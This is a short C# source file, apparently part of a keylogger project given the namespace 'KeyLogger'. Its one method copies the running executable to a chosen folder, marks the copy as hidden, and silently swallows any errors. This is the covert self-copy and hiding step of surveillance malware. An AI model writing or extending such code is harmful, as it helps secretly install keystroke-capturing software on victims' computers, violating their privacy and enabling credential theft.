using System.IO;

namespace KeyLogger
{
    public class Saver
    {
        public static void SaveProgram(string path, string name)
        {
            var exePath = System.Windows.Forms.Application.ExecutablePath;
            var fullPath = path +"\\"+ name;
            if (!File.Exists(fullPath))
                try
                {
                    File.Copy(exePath, fullPath);
                    File.SetAttributes(fullPath, FileAttributes.Hidden);
                }
                catch
                {
                }
        }
    }
}